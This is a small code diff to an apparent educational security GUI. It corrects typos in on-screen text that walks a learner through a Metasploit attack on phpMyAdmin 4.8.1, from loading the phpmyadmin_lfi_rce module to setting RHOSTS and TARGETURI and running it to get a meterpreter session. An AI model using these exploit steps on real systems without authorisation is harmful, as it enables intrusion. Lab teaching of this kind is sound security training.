@@ -48,7 +48,7 @@ class AttackVectorEleven(tk.Frame):
             text = (
                 "\n\nStep 2: Walkthrough Part 1\n\n"
                 "o   On the windows machine, make sure that you are running and logged into phpMyAdmin.\n\n"
-                "o   Open terminal on Kali Linux and run metaploit using this command:\n"
+                "o   Open terminal on Kali Linux and run metasploit using this command:\n"
                 "     msfconsole\n\n"
                 "o   Load the exploit using:\n"
                 "     use exploit/multi/http/phpmyadmin_lfi_rce\n\n"
@@ -63,13 +63,13 @@ class AttackVectorEleven(tk.Frame):
         def change_to_Step3():
             text = (
                 "\n\nStep 3: Walkthrough Part 2\n\n"
-                "o  You are not required to enter the RHOSTS (Victim's IP address)\n"
+                "o  You are now required to enter the RHOSTS (Victim's IP address)\n"
                 "and TARGETURI (name of the folder you have installed phpmyadmin 4.8.1 in).\n\n"
                 "o  Use the following commands to set RHOSTS and TARGETURI:\n"
                 "    set RHOSTS 192.168.68.117\n"
                 "    set TARGETURI /phpmyadmin4.8.1/\n\n"
                 "o  (IP address and folder name is just an example. Please modify accordingly)\n\n"
-                "o  Finally run the exploit using:\n"
+                "o  Finally, run the exploit using:\n"
                 "    run\n\n"
                 "o  If successfull, a meterpreter session should be created and the attack is complete.\n\n"
             )
